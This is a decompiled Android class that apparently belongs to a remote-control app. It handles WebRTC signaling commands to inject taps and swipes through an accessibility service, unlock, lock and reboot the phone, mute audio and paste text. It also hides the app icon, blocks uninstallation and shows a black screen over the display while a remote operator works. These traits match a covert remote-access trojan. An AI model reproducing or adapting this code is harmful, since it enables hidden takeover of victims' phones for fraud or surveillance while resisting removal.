package defpackage;

import android.accessibilityservice.GestureDescription;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.media.AudioManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import com.mamimobi.AccessService;
import com.mamimobi.receiver.DAReceiver;
import com.mamimobi.videostream.model.SignalingMessage;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;
import org.webrtc.IceCandidate;
import org.webrtc.MediaStreamTrack;
import org.webrtc.PeerConnection;
import org.webrtc.SessionDescription;
import org.webrtc.VideoTrack;

/* JADX INFO: loaded from: classes.dex */
public final class k71 {
    public boolean a = false;
    public final /* synthetic */ Context b;
    public final /* synthetic */ o71 c;

    public k71(o71 o71Var, Context context) {
        this.c = o71Var;
        this.b = context;
    }

    public final void a(SignalingMessage signalingMessage) {
        if (AccessService.e0 == null) {
            return;
        }
        try {
            Map<String, Object> map = signalingMessage.payload;
            Object obj = map.get("x");
            Objects.requireNonNull(obj);
            String string = obj.toString();
            Objects.requireNonNull(map.get("y"));
            d91.a(AccessService.e0, Math.round(Float.parseFloat(string)), Math.round(Float.parseFloat(r3.toString())));
        } catch (Exception unused) {
        }
    }

    public final void b(SignalingMessage signalingMessage) {
        o71 o71Var = this.c;
        String str = signalingMessage.key;
        try {
            o71Var.j = signalingMessage.sender;
            if (AccessService.e0 != null) {
                if ("RECENTS".equals(str)) {
                    AccessService.e0.performGlobalAction(3);
                } else if ("HOME".equals(str)) {
                    AccessService.e0.performGlobalAction(2);
                } else if ("BACK".equals(str)) {
                    AccessService.e0.performGlobalAction(1);
                } else {
                    boolean zEquals = "WAKE".equals(str);
                    Context context = this.b;
                    if (zEquals) {
                        if (!((PowerManager) context.getSystemService("power")).isInteractive()) {
                            o80.j0(context);
                            AccessService.a1.postDelayed(new l1(14), 600L);
                        }
                    } else if ("UNLOCKSCREEN".equals(str)) {
                        AccessService.j0.set(true);
                        if (((PowerManager) context.getSystemService("power")).isInteractive()) {
                            AccessService.a1.postDelayed(new h71(this, 3), 3000L);
                        } else {
                            o80.j0(context);
                            Handler handler = AccessService.a1;
                            handler.postDelayed(new l1(16), 600L);
                            handler.postDelayed(new h71(this, 4), 3000L);
                        }
                    } else if ("REBOOT".equals(str)) {
                        AccessService.e0.performGlobalAction(6);
                    } else if ("HIDEICON".equals(str)) {
                        String packageName = context.getPackageName();
                        try {
                            PackageManager packageManager = context.getPackageManager();
                            if (packageManager.getApplicationInfo(packageName, 0).enabled) {
                                packageManager.setApplicationEnabledSetting(packageName, 2, 0);
                            }
                        } catch (PackageManager.NameNotFoundException e) {
                            e.printStackTrace();
                        }
                    } else if ("SHOWICON".equals(str)) {
                        String packageName2 = context.getPackageName();
                        try {
                            PackageManager packageManager2 = context.getPackageManager();
                            if (!packageManager2.getApplicationInfo(packageName2, 0).enabled) {
                                packageManager2.setApplicationEnabledSetting(packageName2, 0, 0);
                            }
                        } catch (PackageManager.NameNotFoundException e2) {
                            e2.printStackTrace();
                        }
                    } else if ("QUICK_SETTINGS".equals(str)) {
                        fa0.I();
                    } else if ("NOTIFICATIONS".equals(str)) {
                        fa0.H();
                    } else if ("MUTE".equals(str)) {
                        AudioManager audioManager = (AudioManager) context.getSystemService(MediaStreamTrack.AUDIO_TRACK_KIND);
                        if (audioManager != null) {
                            audioManager.setStreamVolume(3, 0, 0);
                            audioManager.setStreamVolume(5, 0, 0);
                            audioManager.setStreamVolume(1, 0, 0);
                            audioManager.setStreamVolume(2, 0, 0);
                            audioManager.adjustStreamVolume(3, -100, 0);
                        }
                    } else if ("LOCK_SCREEN".equals(str)) {
                        PowerManager powerManager = (PowerManager) context.getSystemService("power");
                        if (powerManager == null || powerManager.isInteractive()) {
                            new Handler(Looper.getMainLooper()).postDelayed(new l1(17), 300L);
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
                            ComponentName componentName = new ComponentName(context, (Class<?>) DAReceiver.class);
                            if (devicePolicyManager.isAdminActive(componentName)) {
                                devicePolicyManager.lockNow();
                            } else if (Build.VERSION.SDK_INT >= 28) {
                                new Handler(Looper.getMainLooper()).postDelayed(new l1(18), 300L);
                            } else {
                                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                                intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
                                intent.putExtra("android.app.extra.ADD_EXPLANATION", "需要锁屏权限");
                                context.startActivity(intent);
                            }
                        }
                    } else {
                        boolean zEquals2 = "SHOWBLACKSCREEN".equals(str);
                        l1 l1Var = o71Var.n;
                        Handler handler2 = o71Var.m;
                        if (zEquals2) {
                            handler2.post(new l1(19));
                            handler2.removeCallbacks(l1Var);
                        } else if ("HIDELACKSCREEN".equals(str)) {
                            handler2.removeCallbacks(l1Var);
                            handler2.post(l1Var);
                        } else if ("SHOWLOADINGDIALOG".equals(str)) {
                            AccessService.I();
                        } else if ("HIDELOADINGDIALOG".equals(str)) {
                            AccessService.s();
                        } else if ("PASTE".equals(str)) {
                            AccessService.Y = signalingMessage.text;
                            AccessService.e0.C();
                        } else if ("OPENPROTECT".equals(str)) {
                            AccessService.M0.set(true);
                            fa0.R0(AccessService.e0, "isForbiddenUninstall", true);
                        } else if ("CLOSEPROTECT".equals(str)) {
                            AccessService.M0.set(false);
                            fa0.R0(AccessService.e0, "isForbiddenUninstall", false);
                        } else if ("DESKSETTING".equals(str)) {
                            AccessService.e0.performGlobalAction(2);
                            AccessService.a1.postDelayed(new l1(20), 1000L);
                        } else if ("UP".equals(str) || "DOWN".equals(str) || "LEFT".equals(str) || "RIGHT".equals(str)) {
                            o80.a0(AccessService.e0, str);
                        } else if ("OPENSCREENHELPER".equals(str)) {
                            AccessService.H0.set(true);
                        } else if ("CLOSESCREENHELPER".equals(str)) {
                            AccessService.H0.set(false);
                        } else if ("PAGEEXIT".equals(str)) {
                            o71Var.g();
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    public final void c(SignalingMessage signalingMessage) {
        Map<String, Object> map = signalingMessage.payload;
        try {
            Object obj = map.get("start");
            Objects.requireNonNull(obj);
            JSONObject jSONObject = new JSONObject(obj.toString());
            Object obj2 = map.get("end");
            Objects.requireNonNull(obj2);
            JSONObject jSONObject2 = new JSONObject(obj2.toString());
            AccessService accessService = AccessService.e0;
            if (accessService != null) {
                float fRound = Math.round(jSONObject.getDouble("x"));
                float fRound2 = Math.round(jSONObject.getDouble("y"));
                float fRound3 = Math.round(jSONObject2.getDouble("x"));
                float fRound4 = Math.round(jSONObject2.getDouble("y"));
                AtomicBoolean atomicBoolean = d91.a;
                Path path = new Path();
                path.moveTo(fRound, fRound2);
                path.lineTo(fRound3, fRound4);
                GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, 500L, 1300L);
                GestureDescription.Builder builder = new GestureDescription.Builder();
                builder.addStroke(strokeDescription);
                accessService.dispatchGesture(builder.build(), new vm0(2), null);
            }
        } catch (Exception unused) {
        }
        Log.d("CloudPhone", signalingMessage.payload.toString());
    }

    public final void d(String str) {
        SessionDescription sessionDescription = new SessionDescription(SessionDescription.Type.ANSWER, str);
        o71 o71Var = this.c;
        o71Var.c.setRemoteDescription(o71Var.h, sessionDescription);
    }

    public final void e(IceCandidate iceCandidate) {
        try {
            PeerConnection peerConnection = this.c.c;
            if (peerConnection != null) {
                peerConnection.addIceCandidate(iceCandidate);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public final void f(SignalingMessage signalingMessage) {
        o71 o71Var = this.c;
        o71Var.i = signalingMessage;
        o71Var.d();
        new Handler(Looper.getMainLooper()).post(new j(this, this.b, signalingMessage, 7));
    }

    public final void g(SignalingMessage signalingMessage) {
        VideoTrack videoTrack;
        VideoTrack videoTrack2;
        if (signalingMessage == null) {
            return;
        }
        o71.w.remove(signalingMessage.name);
        String str = signalingMessage.type;
        boolean zEquals = str.equals("screen");
        o71 o71Var = this.c;
        try {
            if (zEquals) {
                if (!((or0) o71Var.f.d).b() || (videoTrack2 = ((or0) o71Var.f.d).c) == null) {
                    return;
                }
                videoTrack2.setEnabled(false);
                return;
            }
            if (str.equals("screenHelper")) {
                if (!((pr0) o71Var.f.e).a() || (videoTrack = ((pr0) o71Var.f.e).d) == null) {
                    return;
                }
                videoTrack.setEnabled(false);
                return;
            }
            VideoTrack videoTrack3 = ((zb) o71Var.f.f).e;
            if (videoTrack3 == null) {
                return;
            }
            videoTrack3.setEnabled(false);
        } catch (Exception unused) {
        }
    }
}
